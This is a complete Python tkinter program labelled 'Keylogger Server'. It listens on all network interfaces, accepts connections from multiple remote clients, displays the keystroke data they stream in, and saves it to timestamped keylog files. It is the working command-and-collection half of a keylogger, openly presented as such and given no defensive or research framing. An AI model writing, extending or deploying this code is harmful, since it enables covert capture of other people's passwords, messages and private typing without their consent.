import socket
import threading
import time
from datetime import datetime
import tkinter as tk
from tkinter import scrolledtext, messagebox, Menu

class KeyloggerServerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Server")
        self.root.geometry("800x600")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Server configuration
        self.host = '0.0.0.0'  # Listen on all interfaces
        self.port = 5555
        self.server_socket = None
        self.clients = []
        self.running = False
        self.server_thread = None
        
        # Create menu
        self.menu_bar = Menu(root)
        self.file_menu = Menu(self.menu_bar, tearoff=0)
        self.file_menu.add_command(label="Save Logs", command=self.save_logs)
        self.file_menu.add_command(label="Clear Logs", command=self.clear_logs)
        self.file_menu.add_separator()
        self.file_menu.add_command(label="Exit", command=self.on_closing)
        self.menu_bar.add_cascade(label="File", menu=self.file_menu)
        root.config(menu=self.menu_bar)
        
        # Create GUI elements
        self.create_widgets()
        
    def create_widgets(self):
        # Top frame for server controls
        self.control_frame = tk.Frame(self.root, pady=10)
        self.control_frame.pack(fill=tk.X)
        
        # Server host and port entry
        tk.Label(self.control_frame, text="Host:").grid(row=0, column=0, padx=5)
        self.host_entry = tk.Entry(self.control_frame, width=15)
        self.host_entry.insert(0, self.host)
        self.host_entry.grid(row=0, column=1, padx=5)
        
        tk.Label(self.control_frame, text="Port:").grid(row=0, column=2, padx=5)
        self.port_entry = tk.Entry(self.control_frame, width=6)
        self.port_entry.insert(0, str(self.port))
        self.port_entry.grid(row=0, column=3, padx=5)
        
        # Server control buttons
        self.start_button = tk.Button(self.control_frame, text="Start Server", command=self.start_server)
        self.start_button.grid(row=0, column=4, padx=10)
        
        self.stop_button = tk.Button(self.control_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.grid(row=0, column=5, padx=10)
        
        # Status label
        self.status_var = tk.StringVar()
        self.status_var.set("Server Status: Stopped")
        self.status_label = tk.Label(self.control_frame, textvariable=self.status_var, fg="red")
        self.status_label.grid(row=0, column=6, padx=10)
        
        # Middle frame for connected clients
        self.client_frame = tk.LabelFrame(self.root, text="Connected Clients", padx=10, pady=10)
        self.client_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.client_listbox = tk.Listbox(self.client_frame, height=5)
        self.client_listbox.pack(fill=tk.X)
        
        # Bottom frame for log display
        self.log_frame = tk.LabelFrame(self.root, text="Keylogger Data", padx=10, pady=10)
        self.log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.log_text = scrolledtext.ScrolledText(self.log_frame)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        # Auto-scroll toggle
        self.autoscroll_var = tk.BooleanVar(value=True)
        self.autoscroll_check = tk.Checkbutton(self.log_frame, text="Auto-scroll", variable=self.autoscroll_var)
        self.autoscroll_check.pack(anchor=tk.W)
    
    def start_server(self):
        """Start the keylogger server"""
        try:
            self.host = self.host_entry.get()
            self.port = int(self.port_entry.get())
            
            self.server_thread = threading.Thread(target=self._run_server)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.host_entry.config(state=tk.DISABLED)
            self.port_entry.config(state=tk.DISABLED)
            self.status_var.set("Server Status: Running")
            self.status_label.config(fg="green")
            
            self.log_message("================ KEYLOGGER SERVER ================")
            self.log_message(f"Server started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            self.log_message("=================================================\n")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {e}")
    
    def _run_server(self):
        """Backend server process"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.settimeout(0.5)  # Add timeout for clean shutdown
            self.server_socket.listen(5)
            self.running = True
            
            while self.running:
                try:
                    client_socket, client_address = self.server_socket.accept()
                    
                    # Add client to list
                    client_id = f"{client_address[0]}:{client_address[1]}"
                    self.clients.append((client_socket, client_address, client_id))
                    
                    # Update UI in main thread
                    self.root.after(0, lambda: self.add_client(client_id))
                    self.root.after(0, lambda: self.log_message(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] New client connected: {client_id}"
                    ))
                    
                    # Create thread to handle this client
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_address, client_id)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.timeout:
                    # This is just to allow checking of self.running
                    continue
                except Exception as e:
                    if self.running:
                        self.root.after(0, lambda: self.log_message(f"[!] Error accepting client: {e}"))
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Server Error", f"Server error: {e}"))
            self.running = False
        finally:
            if self.server_socket:
                self.server_socket.close()
    
    def handle_client(self, client_socket, client_address, client_id):
        """Handle communication with a client"""
        try:
            while self.running:
                try:
                    # Receive data from client with small timeout
                    client_socket.settimeout(0.5)
                    data = client_socket.recv(1024).decode('utf-8')
                    
                    if not data:
                        break
                    
                    # Log received keystrokes (in main thread)
                    self.root.after(0, lambda d=data: self.log_message(d.rstrip()))
                except socket.timeout:
                    continue
                except Exception:
                    break
        finally:
            # Remove and close client connection
            client_socket.close()
            
            # Remove from list and update UI in main thread
            self.clients = [(s, a, i) for s, a, i in self.clients if i != client_id]
            self.root.after(0, lambda: self.remove_client(client_id))
            self.root.after(0, lambda: self.log_message(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Client disconnected: {client_id}"
            ))
    
    def stop_server(self):
        """Stop the server and close all connections"""
        self.running = False
        
        # Close all client connections
        for client_socket, _, _ in self.clients:
            try:
                client_socket.close()
            except:
                pass
        self.clients.clear()
        
        # Clear client list in UI
        self.client_listbox.delete(0, tk.END)
        
        # Enable/disable buttons
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.host_entry.config(state=tk.NORMAL)
        self.port_entry.config(state=tk.NORMAL)
        self.status_var.set("Server Status: Stopped")
        self.status_label.config(fg="red")
        
        self.log_message(f"\nServer stopped: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.log_message("================ SERVER STOPPED ================\n")
    
    def add_client(self, client_id):
        """Add a client to the client list"""
        self.client_listbox.insert(tk.END, client_id)
    
    def remove_client(self, client_id):
        """Remove a client from the client list"""
        for i in range(self.client_listbox.size()):
            if self.client_listbox.get(i) == client_id:
                self.client_listbox.delete(i)
                break
    
    def log_message(self, message):
        """Add a message to the log window"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, message + "\n")
        if self.autoscroll_var.get():
            self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def save_logs(self):
        """Save logs to a file"""
        try:
            filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, "w") as f:
                f.write(self.log_text.get(1.0, tk.END))
            messagebox.showinfo("Logs Saved", f"Logs have been saved to {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save logs: {e}")
    
    def clear_logs(self):
        """Clear the log window"""
        if messagebox.askyesno("Clear Logs", "Are you sure you want to clear all logs?"):
            self.log_text.config(state=tk.NORMAL)
            self.log_text.delete(1.0, tk.END)
            self.log_text.config(state=tk.DISABLED)
    
    def on_closing(self):
        """Handle window closing"""
        if self.running:
            if messagebox.askyesno("Quit", "Server is running. Stop server and quit?"):
                self.stop_server()
                self.root.destroy()
        else:
            self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerServerGUI(root)
    root.mainloop()